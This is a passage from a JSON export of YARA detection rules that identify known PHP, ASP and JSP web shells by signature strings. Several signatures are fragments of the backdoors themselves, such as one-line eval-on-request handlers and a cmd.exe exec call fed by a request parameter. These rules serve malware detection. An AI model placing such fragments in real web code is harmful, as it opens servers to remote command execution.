https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<input type=\\\"checkbox\\\" name=\\\"autoUpdate\\\" value=\\\"AutoUpdate\\\" on\" \n      $s1 = \"onblur=\\\"document.shell.autoUpdate.checked= this.oldValue;\" \n   condition: \n      all of them\n}","date":"2014-01-28 11:16:21","description":"Web Shell - file jspShell.jsp","minimum_yara":"1.7","name":"Webshell_jspShell_1_RID2E7B","reference":"-","required_modules":[],"rule_hash":"c87a356220ac19e0af9cddc2780e8576","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Dx_Dx_RID2C7D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Dx.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 09:51:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"print \\\"\\\\n\\\".'Tip: to view the file \\\"as is\\\" - open the page in <a href=\\\"'.Dx\" \n      $s9 = \"class=linelisting><nobr>POST (php eval)</td><\" \n   condition: \n      1 of them\n}","date":"2014-01-28 09:51:21","description":"Web Shell - file Dx.php","minimum_yara":"1.7","name":"Webshell_Dx_Dx_RID2C7D","reference":"-","required_modules":[],"rule_hash":"eaba0e9c1da7c89f4cfefe12bdfef60e","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_asp_ntdaddy_RID2F31 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file ntdaddy.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:46:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s9 = \"if  FP  =  \\\"RefreshFolder\\\"  or  \" \n      $s10 = \"request.form(\\\"cmdOption\\\")=\\\"DeleteFolder\\\"  \" \n   condition: \n      1 of them\n}","date":"2014-01-28 11:46:41","description":"Web Shell - file ntdaddy.asp","minimum_yara":"1.7","name":"Webshell_asp_ntdaddy_RID2F31","reference":"-","required_modules":[],"rule_hash":"d265857efe821e476e616cb740f57176","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_MySQL_Web_Interface_Version_0_8_RID3634 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file MySQL Web Interface Version 0.8.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 16:45:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>\" \n   condition: \n      all of them\n}","date":"2014-01-28 16:45:51","description":"Web Shell - file MySQL Web Interface Version 0.8.php","minimum_yara":"1.7","name":"Webshell_MySQL_Web_Interface_Version_0_8_RID3634","reference":"-","required_modules":[],"rule_hash":"7e0986b901c9f243894464b80aa3c6fb","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_elmaliseker_2_RID2FC5 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file elmaliseker.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:11:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<td<%if (FSO.GetExtensionName(path & \\\"\\\\\\\" & oFile.Name)=\\\"lnk\\\") or (FSO.GetEx\" \n      $s6 = \"<input type=button value=Save onclick=\\\"EditorCommand('Save')\\\"> <input type=but\" \n   condition: \n      all of them\n}","date":"2014-01-28 12:11:21","description":"Web Shell - file elmaliseker.asp","minimum_yara":"1.7","name":"Webshell_elmaliseker_2_RID2FC5","reference":"-","required_modules":[],"rule_hash":"941c4f6e060383f0dd2daadf92532721","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_ASP_RemExp_RID2E3A : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file RemExp.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:05:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<td bgcolor=\\\"<%=BgColor%>\\\" title=\\\"<%=SubFolder.Name%>\\\"> <a href= \\\"<%=Reques\" \n      $s1 = \"Private Function ConvertBinary(ByVal SourceNumber, ByVal MaxValuePerIndex, ByVal\" \n   condition: \n      all of them\n}","date":"2014-01-28 11:05:31","description":"Web Shell - file RemExp.asp","minimum_yara":"1.7","name":"Webshell_ASP_RemExp_RID2E3A","reference":"-","required_modules":[],"rule_hash":"1d77481829996e3353103580647bc9af","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jsp_list1_RID2E3F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file list1.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:06:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"case 's':ConnectionDBM(out,encodeChange(request.getParameter(\\\"drive\" \n      $s9 = \"return \\\"<a href=\\\\\\\"javascript:delFile('\\\"+folderReplace(file)+\\\"')\\\\\\\"\" \n   condition: \n      all of them\n}","date":"2014-01-28 11:06:21","description":"Web Shell - file list1.jsp","minimum_yara":"1.7","name":"Webshell_jsp_list1_RID2E3F","reference":"-","required_modules":[],"rule_hash":"82d56531df22976c79458416adf2b056","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_phpkit_1_0_odd_RID2FEB : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file odd.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:17:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"include('php://input');\" fullword\n      $s1 = \"// No eval() calls, no system() calls, nothing normally seen as malicious.\" fullword\n      $s2 = \"ini_set('allow_url_include, 1'); // Allow url inclusion in this script\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 12:17:41","description":"Web Shell - file odd.php","minimum_yara":"1.7","name":"Webshell_phpkit_1_0_odd_RID2FEB","reference":"-","required_modules":[],"rule_hash":"3040847e37a73f7286c9de703b60bdd2","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jsp_123_RID2CE8 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file 123.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:09:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<font color=\\\"blue\\\">??????????????????:</font><input type=\\\"text\\\" size=\\\"7\" \n      $s3 = \"String path=new String(request.getParameter(\\\"path\\\").getBytes(\\\"ISO-8859-1\\\"\" \n      $s9 = \"<input type=\\\"submit\\\" name=\\\"btnSubmit\\\" value=\\\"Upload\\\">    \" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 10:09:11","description":"Web Shell - file 123.jsp","minimum_yara":"1.7","name":"Webshell_jsp_123_RID2CE8","reference":"-","required_modules":[],"rule_hash":"2b74f8b750e6a1df39ba8aaf454f8540","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_asp_1_RID2C7A : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file 1.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 09:50:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"!22222222222222222222222222222222222222222222222222\" fullword\n      $s8 = \"<%eval request(\\\"pass\\\")%>\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 09:50:51","description":"Web Shell - file 1.asp","minimum_yara":"1.7","name":"Webshell_asp_1_RID2C7A","reference":"-","required_modules":[],"rule_hash":"45863b96497b37263ff50e897877de6b","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_cmd_win32_RID2DEC : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file cmd_win32.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:52:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Process p = Runtime.getRuntime().exec(\\\"cmd.exe /c \\\" + request.getParam\" \n      $s1 = \"<FORM METHOD=\\\"POST\\\" NAME=\\\"myform\\\" ACTION=\\\"\\\">\" fullword\n   condition: \n      2 of them\n}","date":"2014-01-28 10:52:31","description":"Web Shell - file cmd_win32.jsp","minimum_yara":"1.7","name":"Webshell_cmd_win32_RID2DEC","reference":"-","required_modules":[],"rule_hash":"ce25ed207dfe366958e8bd18be9f2b7a","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jsp_jshell_RID2ED4 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file jshell.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:31:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"kXpeW[\\\"\" fullword\n      $s4 = \"[7b:g0W@W<\" fullword\n      $s5 = \"b:gHr,g<\" fullword\n      $s8 = \"RhV0W@W<\" fullword\n      $s9 = \"S_MR(u7b\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 11:31:11","description":"Web Shell - file jshell.jsp","minimum_yara":"1.7","name":"Webshell_jsp_jshell_RID2ED4","reference":"-","required_modules":[],"rule_hash":"5e702733ae3abb28469c54a7710e3623","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_ASP_zehir4_RID2E3F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file zehir4.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:06:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s9 = \"Response.Write \\\"<a href='\\\"&dosyaPath&\\\"?status=7&Path=\\\"&Path&\\\"/\" \n   condition: \n      all of them\n}","date":"2014-01-28 11:06:21","description":"Web Shell - file zehir4.asp","minimum_yara":"1.7","name":"Webshell_ASP_zehir4_RID2E3F","reference":"-","required_modules":[],"rule_hash":"aa16deefbdafc06b10e5a0d11ae3c766","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_wsb_idc_RID2D81 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file idc.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:34:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass)\" fullword\n      $s3 = \"{eval($_GET['idc']);}\" fullword\n   condition: \n      1 of them\n}","date":"2014-01-28 10:34:41","description":"Web Shell - file idc.php","minimum_yara":"1.7","name":"Webshell_wsb_idc_RID2D81","reference":"-","required_modules":[],"rule_hash":"fef59b8d72b52481f6810037258fef38","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_cpg_143_incl_xpl_RID308F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file cpg_143_incl_xpl.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:45:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"$data=\\\"username=\\\".urlencode($USER).\\\"&password=\\\".urlencode($PA\" \n      $s5 = \"fputs($sun_tzu,\\\"<?php echo \\\\\\\"Hi Master!\\\\\\\";ini_set(\\\\\\\"max_execution_time\" \n   condition: \n      1 of them\n}","date":"2014-01-28 12:45:01","description":"Web Shell - file cpg_143_incl_xpl.php","minimum_yara":"1.7","name":"Webshell_cpg_143_incl_xpl_RID308F","reference":"-","required_modules":[],"rule_hash":"e49dfc808d7c5c9e3cc662fa53b7ccf5","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_mumaasp_com_RID2F38 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file mumaasp.com.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:47:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"&9K_)P82ai,A}I92]R\\\"q!C:RZ}S6]=PaTTR\" \n   condition: \n      all of them\n}","date":"2014-01-28 11:47:51","description":"Web Shell - file mumaasp.com.asp","minimum_yara":"1.7","name":"Webshell_mumaasp_com_RID2F38","reference":"-","required_modules":[],"rule_hash":"e92c5cc5238ebe29ac131896b1ad0d21","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_php_404_a_RID2DA5 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file 404.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:40:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$pass = md5(md5(md5($pass)));\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 10:40:41","description":"Web Shell - file 404.php","minimum_yara":"1.7","name":"Webshell_php_404_a_RID2DA5","reference":"-","required_modules":[],"rule_hash":"a70ebf13b66d625135f5c18c99067af7","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_webshell_cnseay_x_RID31B5 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file webshell-cnseay-x.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:34:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s9 = \"$_F_F.='_'.$_P_P[5].$_P_P[20].$_P_P[13].$_P_P[2].$_P_P[19].$_P_P[8].$_P_\" \n   condition: \n      all of them\n}","date":"2014-01-28 13:34:01","description":"Web Shell - file webshell-cnseay-x.php","minimum_yara":"1.7","name":"Webshell_webshell_cnseay_x_RID31B5","reference":"-","required_modules":[],"rule_hash":"e0feb4199ede4889747f1e6cd3f1bb29","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_asp_up_RID2D2E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file up.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:20:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Pos = InstrB(BoundaryPos,RequestBin,getByteString(\\\"Content-Dispositio\" \n      $s1 = \"ContentType = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))\" fullword\n   condition: \n      1 of them\n}","date":"2014-01-28 10:20:51","description":"Web Shell - file up.asp","minimum_yara":"1.7","name":"Webshell_asp_up_RID2D2E","reference":"-","required_modules":[],"rule_hash":"8bd34f4c957915e13d9edbed8751ff61","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_ASP_cmd_2_RID2DAE : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file cmd.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:42:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%= \\\"\\\\\\\\\\\" & oScriptNet.ComputerName & \\\"\\\\\\\" & oScriptNet.UserName %>\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 10:42:11","description":"Web Shell - file cmd.asp","minimum_yara":"1.7","name":"Webshell_ASP_cmd_2_RID2DAE","reference":"-","required_modules":[],"rule_hash":"211a8cc7788568995026679d7e7dacef","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_PHP_g00nv13_RID2DFC : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file g00nv13.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:55:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"case \\\"zip\\\": case \\\"tar\\\": case \\\"rar\\\": case \\\"gz\\\": case \\\"cab\\\": cas\" \n      $s4 = \"if(!($sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_p\" \n   condition: \n      all of them\n}","date":"2014-01-28 10:55:11","description":"Web Shell - file g00nv13.php","minimum_yara":"1.7","name":"Webshell_PHP_g00nv13_RID2DFC","reference":"-","required_modules":[],"rule_hash":"0b48701b763acc39c3d23f9070c51334","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_php_h6ss_RID2DD1 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file h6ss.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:48:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?php eval(gzuncompress(base64_decode(\\\"\" \n   condition: \n      all of them\n}","date":"2014-01-28 10:48:01","description":"Web Shell - file h6ss.php","minimum_yara":"1.7","name":"Webshell_php_h6ss_RID2DD1","reference":"-","required_modules":[],"rule_hash":"6389485af5c83fe9ba52b7dd1fe79f39","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Ani_Shell_RID2E15 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Ani-Shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:59:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$Python_CODE = \\\"I\" \n      $s6 = \"$passwordPrompt = \\\"\\\\n=================================================\" \n      $s7 = \"fputs ($sockfd ,\\\"\\\\n===============================================\" \n   condition: \n      1 of them\n}","date":"2014-01-28 10:59:21","description":"Web Shell - file Ani-Shell.php","minimum_yara":"1.7","name":"Webshell_Ani_Shell_RID2E15","reference":"-","required_modules":[],"rule_hash":"6afe0288c7d0939d6ad1e74c4dfdffe7","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jsp_k8cmd_RID2E29 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file k8cmd.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:02:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"if(request.getSession().getAttribute(\\\"hehe\\\").toString().equals(\\\"hehe\\\"))\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 11:02:41","description":"Web Shell - file k8cmd.jsp","minimum_yara":"1.7","name":"Webshell_jsp_k8cmd_RID2E29","reference":"-","required_modules":[],"rule_hash":"53cff48b3152aa7e06efda8363959bce","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jsp_cmd_1_RID2E16 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file cmd.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:59:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"out.println(\\\"Command: \\\" + request.getParameter(\\\"cmd\\\") + \\\"<BR>\\\");\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 10:59:31","description":"Web Shell - file cmd.jsp","minimum_yara":"1.7","name":"Webshell_jsp_cmd_1_RID2E16","reference":"-","required_modules":[],"rule_hash":"84178173ea2f100a55d510319874944a","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jsp_k81_RID2D26 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file k81.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:19:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);\" fullword\n      $s9 = \"if(cmd.equals(\\\"Szh0ZWFt\\\")){out.print(\\\"[S]\\\"+dir+\\\"[E]\\\");}\" fullword\n   condition: \n      1 of them\n}","date":"2014-01-28 10:19:31","description":"Web Shell - file k81.jsp","minimum_yara":"1.7","name":"Webshell_jsp_k81_RID2D26","reference":"-","required_modules":[],"rule_hash":"a94f608f012a69fda29c4203ae9862e9","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_ASP_zehir_RID2E0B : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file zehir.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:57:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s9 = \"Response.Write \\\"<font face=wingdings size=3><a href='\\\"&dosyaPath&\\\"?status=18&\" \n   condition: \n      all of them\n}","date":"2014-01-28 10:57:41","description":"Web Shell - file zehir.asp","minimum_yara":"1.7","name":"Webshell_ASP_zehir_RID2E0B","reference":"-","required_modules":[],"rule_hash":"779a43415a80215f54a1fd0cffbcea07","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Worse_Linux_Shell_1_RID320C : DEMO LINUX T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Worse Linux Shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:48:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, LINUX, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"system(\\\"mv \\\".$_FILES['_upl']['tmp_name'].\\\" \\\".$currentWD\" \n   condition: \n      all of them\n}","date":"2014-01-28 13:48:31","description":"Web Shell - file Worse Linux Shell.php","minimum_yara":"1.7","name":"Webshell_Worse_Linux_Shell_1_RID320C","reference":"-","required_modules":[],"rule_hash":"5ae199f8f19f8de463b833933db56a75","score":70,"tags":["T1100","DEMO","LINUX","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_zacosmall_RID2E6C : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file zacosmall.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:13:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if($cmd!==''){ echo('<strong>'.htmlspecialchars($cmd).\\\"</strong><hr>\" \n   condition: \n      all of them\n}","date":"2014-01-28 11:13:51","description":"Web Shell - file zacosmall.php","minimum_yara":"1.7","name":"Webshell_zacosmall_RID2E6C","reference":"-","required_modules":[],"rule_hash":"8ef091866dd89be82ff66a7bbed64934","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_redirect_RID2DF8 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file redirect.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:54:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"var flag = \\\"?txt=\\\" + (document.getElementById(\\\"dl\\\").checked ? \\\"2\\\":\\\"1\\\" \" \n   condition: \n      all of them\n}","date":"2014-01-28 10:54:31","description":"Web Shell - file redirect.asp","minimum_yara":"1.7","name":"Webshell_redirect_RID2DF8","reference":"-","required_modules":[],"rule_hash":"3c2171972e31fa9be387f69ac39c9dab","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jsp_cmdjsp_RID2ED3 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file cmdjsp.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:31:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"<FORM METHOD=GET ACTION='cmdjsp.jsp'>\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 11:31:01","description":"Web Shell - file cmdjsp.jsp","minimum_yara":"1.7","name":"Webshell_jsp_cmdjsp_RID2ED3","reference":"-","required_modules":[],"rule_hash":"ea7e4035038723b792891074c66b92ed","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Java_Shell_RID2E7F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Java Shell.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:17:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC 